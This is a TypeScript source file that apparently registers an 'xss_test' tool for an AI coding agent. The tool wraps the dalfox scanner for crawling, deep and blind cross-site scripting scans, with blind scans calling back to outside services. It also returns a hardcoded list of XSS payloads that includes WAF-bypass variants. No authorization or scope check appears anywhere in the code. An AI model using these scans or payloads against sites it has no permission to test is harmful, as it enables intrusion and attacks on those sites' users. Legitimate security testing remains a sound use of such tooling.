export * as XssTestTool from "./xss-test"

import { ToolFailure } from "@opencode-ai/llm"
import { Effect, Layer, Schema } from "effect"
import { makeLocationNode } from "../effect/app-node"
import { AppProcess } from "../process"
import { ToolRegistry } from "./registry"
import { Tool } from "./tool"
import { Tools } from "./tools"
import { ChildProcess } from "effect/unstable/process"
import { Duration } from "effect"

export const name = "xss_test"

export const Input = Schema.Struct({
  url: Schema.String.annotate({
    description: "Target URL. For parameter testing, include the parameter (e.g. https://target.com/search?q=test).",
  }),
  action: Schema.String.pipe(Schema.optional).annotate({
    description:
      "XSS test action: 'scan' (automated scan via dalfox, default), 'single' (test a single parameter), 'crawled' (crawl site then test all found params), 'blind' (blind XSS with callback), 'payload_list' (output common payloads for manual testing)",
  }),
  param: Schema.String.pipe(Schema.optional).annotate({
    description: "Specific parameter name to test (for 'single' action).",
  }),
  blind_callback: Schema.String.pipe(Schema.optional).annotate({
    description: "Blind XSS callback URL (e.g. your xss.ht or bxss.me URL).",
  }),
  payload: Schema.String.pipe(Schema.optional).annotate({
    description: "Custom XSS payload to test with.",
  }),
})

const Output = Schema.Struct({
  output: Schema.String,
  exit: Schema.Number.pipe(Schema.optional),
})

const layer = Layer.effectDiscard(
  Effect.gen(function* () {
    const tools = yield* Tools.Service
    const appProcess = yield* AppProcess.Service

    yield* tools
      .register({
        [name]: Tool.make({
          description: `Automated Cross-Site Scripting (XSS) testing. Uses dalfox for scanning reflected, stored, and DOM-based XSS vulnerabilities. Supports single parameter testing, full site crawling + parameter discovery, blind XSS with callback server integration, and payload list generation. Tests against WAF bypass techniques. Essential for OWASP Top 10 web vulnerability assessment.`,
          input: Input,
          output: Output,
          toModelOutput: ({ output }) => [{ type: "text", text: output.output }],
          execute: (input) =>
            Effect.gen(function* () {
              const shell = process.platform === "win32" ? (process.env.COMSPEC ?? "cmd.exe") : "/bin/sh"
              const action = input.action ?? "scan"

              if (action === "payload_list") {
                const payloads = [
                  "<script>alert(1)</script>",
                  "<img src=x onerror=alert(1)>",
                  "<svg onload=alert(1)>",
                  "<body onload=alert(1)>",
                  "<iframe src=javascript:alert(1)>",
                  "'\"><script>alert(1)</script>",
                  "javascript:alert(1)",
                  "<scr<script>ipt>alert(1)</script>",
                  "<img src=x onerror=alert`1`>",
                  "<svg/onload=alert(1)>",
                  "\"><img src=x onerror=alert(1)>",
                  "'-alert(1)-'",
                  "<details/open/ontoggle=alert(1)>",
                  "<marquee onstart=alert(1)>",
                  "<input onfocus=alert(1) autofocus>",
                  "data:text/html,<script>alert(1)</script>",
                  "<a href=javascript:alert(1)>click</a>",
                  "<style>@import 'javascript:alert(1)'</style>",
                  "<embed src=javascript:alert(1)>",
                  "<object data=javascript:alert(1)>",
                  // WAF bypass
                  "<ScRiPt>alert(1)</ScRiPt>",
                  "<script>eval(atob('YWxlcnQoMSk='))</script>",
                  "<img/src=x/onerror=alert(1)>",
                  "<svg><script>alert(1)</script></svg>",
                  "java%00script:alert(1)",
                ]
                return {
                  exit: 0,
                  output: `=== XSS PAYLOAD LIST ===\n\n${payloads.map((p, i) => `${i + 1}. ${p}`).join("\n")}\n\nInject these into parameters, headers, and form fields. Check the response to see if they're reflected unencoded.`,
                }
              }

              const args: string[] = ["url", input.url, "--silence"]

              switch (action) {
                case "single": {
                  if (input.param) args.push("--param", input.param)
                  if (input.payload) args.push("--payload", input.payload)
                  break
                }
                case "crawled": {
                  args.push("--crawl")
                  break
                }
                case "blind": {
                  if (input.blind_callback) {
                    args.push("--blind", "--callback-url", input.blind_callback)
                  } else {
                    return {
                      output: "ERROR: 'blind_callback' URL required for blind XSS testing.\nGet a callback URL from:\n- https://xss.ht\n- https://bxss.me\n- XSS Hunter: https://xsshunter.com",
                    }
                  }
                  break
                }
                case "scan":
                default: {
                  args.push("--deep")
                  break
                }
              }

              const cmd = ChildProcess.make("dalfox", args, { shell, stdin: "ignore", forceKillAfter: Duration.seconds(15) })
              const result = yield* appProcess.run(cmd, { combineOutput: true, timeout: Duration.minutes(15), maxOutputBytes: 5 * 1024 * 1024 }).pipe(Effect.catchTag("AppProcessError", () => Effect.succeed(undefined)))

              if (!result) {
                return {
                  output: "dalfox not found. Install: go install github.com/hahwul/dalfox/v2@latest\nOr use the payload_list action for manual testing.",
                }
              }

              const stdout = result.output?.toString("utf8") ?? ""
              const found = stdout.includes("[V]") || stdout.toLowerCase().includes("verified") || stdout.includes("reflected")

              return {
                exit: result.exitCode,
                output: found
                  ? `🎉 XSS VULNERABILITY FOUND!\n\n${stdout}\n\n[CRITICAL] Reflected XSS confirmed — payload executes in browser context.`
                  : stdout + "\n\n[INFO] No XSS vulnerabilities found by automated scan.",
              }
            }).pipe(Effect.mapError(() => new ToolFailure({ message: "XSS testing failed" }))),
        }),
      })
      .pipe(Effect.orDie)
  }),
)

export const node = makeLocationNode({
  name: "tool/xss-test",
  layer,
  deps: [ToolRegistry.node, AppProcess.node],
})
